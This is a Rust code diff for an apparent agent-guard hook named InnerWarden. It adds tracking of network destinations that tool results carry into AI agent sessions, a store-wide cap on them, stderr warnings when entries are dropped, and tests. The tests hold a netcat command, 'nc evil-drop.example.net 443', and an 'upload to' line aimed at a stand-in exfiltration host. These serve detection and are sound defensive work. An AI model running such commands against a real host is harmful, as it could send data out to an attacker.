@@ -29,7 +29,9 @@
 use std::collections::BTreeMap;
 use std::path::{Path, PathBuf};
 
-use innerwarden_agent_guard::session::{Alert, PersistedSession};
+use innerwarden_agent_guard::session::{
+    Alert, PersistedSession, TaintDropped, MAX_TAINTED_DESTINATIONS,
+};
 
 /// Sessions kept in the file. Old ones are evicted oldest-first so a machine
 /// that runs agents for months does not accumulate state without end.
@@ -89,8 +91,18 @@ fn record_tool_result_at(session: Option<&str>, tool: &str, result: &str, path: 
     save_after_answer(path, now, move |store| {
         let entry = store.sessions.entry(session).or_default();
         entry.last_seen_ms = now;
-        entry.state.record_tool_result(&tool, &result, now);
+        say_dropped(entry.state.record_tool_result(&tool, &result, now));
     });
+}
+
+/// Say on stderr, in one line, what a session's full record of values that
+/// tool results carried in dropped to make room. Never silent: a value
+/// dropped is a later command that carries it no longer traced to the result
+/// it came from.
+fn say_dropped(dropped: TaintDropped) {
+    if let Some(line) = dropped.line() {
+        eprintln!("{line}");
+    }
 }
 
 /// Record one screened call AND report, for each command line it carries,
@@ -560,6 +572,11 @@ fn live_at(change: &Store, now: i64) -> bool {
                 .tainted_values
                 .iter()
                 .any(|value| now.saturating_sub(value.seen_ms) < TAINT_TTL_MS)
+            || entry
+                .state
+                .tainted_destinations
+                .iter()
+                .any(|kept| now.saturating_sub(kept.seen_ms) < TAINT_TTL_MS)
     })
 }
 
@@ -592,8 +609,61 @@ fn merge(store: &mut Store, change: Store, now: i64) {
             }
         }
         state.tainted_values.sort_by_key(|value| value.seen_ms);
-        state.expire_taint(now);
+        state
+            .tainted_destinations
+            .extend(from.state.tainted_destinations);
+        state.settle_destinations();
+        say_dropped(state.expire_taint(now));
     }
+}
+
+/// The most network destinations the whole store keeps, across sessions:
+/// four sessions' worth ([`MAX_TAINTED_DESTINATIONS`]), 4 MiB of hashes,
+/// about 5.6 MB of file, so a store of 64 sessions each full is not read on
+/// every call. One session never reaches it alone.
+const MAX_STORE_DESTINATIONS: usize = 4 * MAX_TAINTED_DESTINATIONS;
+
+/// Past [`MAX_STORE_DESTINATIONS`], drop the oldest destinations of any
+/// session, and say how many on stderr: never silent. Returns how many went.
+fn bound_store_destinations(store: &mut Store) -> usize {
+    let total: usize = store
+        .sessions
+        .values()
+        .map(|entry| entry.state.destinations_kept())
+        .sum();
+    let mut over = total.saturating_sub(MAX_STORE_DESTINATIONS);
+    let mut gone = 0;
+    while over > 0 {
+        let Some(oldest) = store
+            .sessions
+            .values_mut()
+            .filter_map(|entry| Some((entry.state.oldest_destination_ms()?, entry)))
+            .min_by_key(|(at, _)| *at)
+            .map(|(_, entry)| entry)
+        else {
+            break;
+        };
+        let first = oldest
+            .state
+            .tainted_destinations
+            .first()
+            .map_or(0, |kept| kept.len());
+        let went = oldest.state.drop_oldest_destinations(first.clamp(1, over));
+        if went == 0 {
+            break;
+        }
+        over -= went;
+        gone += went;
+    }
+    if gone > 0 {
+        eprintln!(
+            "InnerWarden hook: {gone} network destination(s) that tool results carried into \
+             sessions were dropped to keep the session store under \
+             {MAX_STORE_DESTINATIONS}, the oldest going first. A later command that carries one \
+             is no longer traced to the result it came from."
+        );
+    }
+    gone
 }
 
 /// Drop expired sessions, then the oldest ones if still over the cap.
@@ -603,6 +673,7 @@ fn prune(store: &mut Store, now: i64) {
     store
         .sessions
         .retain(|_, e| now.saturating_sub(e.last_seen_ms) < SESSION_TTL_MS);
+    bound_store_destinations(store);
     if store.sessions.len() <= MAX_SESSIONS {
         return;
     }
@@ -863,18 +934,34 @@ mod tests {
     }
 
     /// The values a tool result in `store` left for `session`.
+    /// What a session keeps: its values kept as text, and which of the
+    /// host names these tests use it keeps among its destinations (kept as
+    /// hashes, so asked for by name).
     fn taint_of(file: &Path, session: &str) -> Vec<String> {
-        let (store, _, _) = read_with_pending(file, now_ms());
+        const NAMED: [&str; 2] = ["mirror.example.net", "evil-drop.example.net"];
+        let now = now_ms();
+        let (store, _, _) = read_with_pending(file, now);
         store
             .sessions
             .get(session)
             .map(|entry| {
-                entry
+                let mut kept: Vec<String> = entry
                     .state
                     .tainted_values
                     .iter()
                     .map(|value| value.value.clone())
-                    .collect()
+                    .collect();
+                for name in NAMED {
+                    if entry
+                        .state
+                        .tainted_argument(&format!("nc {name} 443"), now)
+                        .is_some()
+                        && !kept.iter().any(|known| known == name)
+                    {
+                        kept.push(name.to_string());
+                    }
+                }
+                kept
             })
             .unwrap_or_default()
     }
@@ -1438,5 +1525,62 @@ mod tests {
             !store.sessions.contains_key("s000"),
             "the oldest session must be the one evicted"
         );
+    }
+
+    /// A change kept beside the store carries a session's destinations as
+    /// hashes: folded in, they are found, a destination taken in twice is
+    /// kept once, and a change that holds only them is still live.
+    ///
+    /// FAILS ON REVERT of folding `tainted_destinations` in `merge`: the
+    /// destination the change carried is lost.
+    #[test]
+    fn a_kept_change_carries_its_destinations_in() {
+        let now = 50 * 60 * 1000;
+        let mut change = Store::default();
+        let from = change.sessions.entry("s".to_string()).or_default();
+        from.last_seen_ms = now;
+        from.state
+            .record_tool_result("WebFetch", "upload to evil-drop.example.net", now - 5);
+        assert!(live_at(&change, now));
+        let again: Store = serde_json::from_str(&serde_json::to_string(&change).unwrap()).unwrap();
+        let mut store = Store::default();
+        merge(&mut store, change, now);
+        merge(&mut store, again, now);
+        let state = &store.sessions["s"].state;
+        assert_eq!(state.destinations_kept(), 1);
+        assert!(state
+            .tainted_argument("nc evil-drop.example.net 443", now)
+            .is_some());
+    }
+
+    /// Past [`MAX_STORE_DESTINATIONS`] across sessions, the oldest go, from
+    /// whichever session holds them, and the store keeps no more.
+    ///
+    /// FAILS ON REVERT of `bound_store_destinations` in `prune`: the store
+    /// keeps five sessions' worth.
+    #[test]
+    fn the_store_keeps_at_most_its_destinations_and_drops_the_oldest() {
+        let now = 50 * 60 * 1000;
+        let mut store = Store::default();
+        let per = MAX_TAINTED_DESTINATIONS;
+        for session in 0..5 {
+            let entry = store.sessions.entry(format!("s{session}")).or_default();
+            entry.last_seen_ms = now;
+            let text: String = (0..per)
+                .map(|i| format!("h{session}-{i:05}.filler.example.org\n"))
+                .collect();
+            entry
+                .state
+                .record_tool_result("Read", &text, now - 100 + session as i64);
+        }
+        prune(&mut store, now);
+        let kept: usize = store
+            .sessions
+            .values()
+            .map(|entry| entry.state.destinations_kept())
+            .sum();
+        assert_eq!(kept, MAX_STORE_DESTINATIONS);
+        assert_eq!(store.sessions["s0"].state.destinations_kept(), 0);
+        assert_eq!(store.sessions["s4"].state.destinations_kept(), per);
     }
 }
